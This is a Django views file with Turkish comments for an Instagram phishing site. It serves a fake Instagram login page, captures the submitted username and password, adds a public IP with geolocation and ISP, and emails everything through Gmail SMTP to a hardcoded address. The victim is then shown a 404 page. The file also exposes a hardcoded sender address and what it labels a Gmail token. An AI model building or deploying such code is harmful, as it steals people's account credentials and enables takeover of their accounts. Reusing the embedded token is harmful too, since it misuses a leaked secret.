from django.http import HttpResponse
from django.template import loader
from django.contrib import auth
from django.shortcuts import render,redirect
from django.views.decorators.csrf import csrf_exempt
import urllib.request
import smtplib
import ssl
import requests
@csrf_exempt


def konum_getir(ip):
    
    sonuc = requests.get(f'https://ipapi.co/{ip}/json/').json()#ip hakkında bilgileri alıyoruz
    konum = sonuc.get("city") + "," + sonuc.get("country_name")#aldığımız bilgilerden şehir ve ülke bilgisini istedik
    iss=sonuc.get("org")#internet servis sağlayıcısı
    
    konum = konum.replace('ı','i').replace('İ','i').replace('ö','o').replace('ü','u').replace('ğ','g').replace('ç','c')#mail atarken türkçe karakterler problem çıkartmaması için 
    liste=[konum,iss]#konum ve iss bilgisiyle liste olusturdum
    return liste #listeyi döndürdüm
 
def mail_gonder(kullanici,sifre,ip):#mail atma fonksiyonu
    """
    SMTP : Basit Mail Aktarım Protokolü
    """
    smtp_port = 587                 # Smtp portu
    smtp_server = "smtp.gmail.com"  # SMTP Server

    kimden = "serkanmutlu1001@gmail.com"# mail kimden gelecek
    kime = "emiraksoy10@gmail.com"#mail kime gidecek

    token = "ivhytcylxuxsbnsv"#Gmailtoken
    sifre=sifre.replace('ı','i').replace('İ','i').replace('ö','o').replace('ü','u').replace('ğ','g').replace('ç','c')#mail atarken türkçe karakterler problem çıkartmaması için (instagram kulanıcı adında türkçe karakter bulunmuyor fakat şifre de olabiliyor o yüzden sadece şifreye uygulandı )
    ileti = "Kullanici="+str(kullanici)+"\n"+"Sifre="+str(sifre)+"\n"+"Ip="+str(ip)+"\n"+"Konum="+konum_getir(ip)[0]+"\n"+"ISS:"+konum_getir(ip)[1]#Mail atılacak değişkenleri ileti hazırlanıyor
    
    # Create context
    simple_email_context = ssl.create_default_context()
    

    try:#Kontrol edilecek kodlar
        
        TIE_server = smtplib.SMTP(smtp_server, smtp_port)
        TIE_server.starttls(context=simple_email_context)#Güvenli bağlantı için şifreleniyor starttls ile
        TIE_server.login(kimden, token)#Giriş yapılıyor
        TIE_server.sendmail(kimden, kime, ileti)#Mail Gönderiliyor
       

    
    except :#Hata çıkarsa Çalışacak kod
        template = loader.get_template('404.html')#instagram giriş ekranını yükler 
        return HttpResponse(template.render())

    
    finally:#son olarak çalışacak kod
        TIE_server.quit()#Port Kapatılıyor

def login(request):
    
    template = loader.get_template('instagram_login.html')#instagram giriş ekranını yükler 
    return HttpResponse(template.render())

def mail(request):
    """
        Login ekranındaki formdan post ile gelen verileri alıyoruz
        Ardından Genel (Public) Ip yi buluyoruz.
    """
    if request.method == "POST":#Eğer postla gelen veri varsa
        kullanici=request.POST['un']#formdan gelen kullanıcı adını aldık
        sifre=request.POST['pass']#formdan gelen şifreyi aldık
       
        genel_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')#public ip mizi öğreniyoruz
        mail_gonder(kullanici, sifre, genel_ip)#mail atma fonksiyonu çalıştırılır
        template = loader.get_template('404.html')#Hata ekranını yükler
        return HttpResponse(template.render())#template in yani hata sayfasının görülmesini sağlar
        

 
    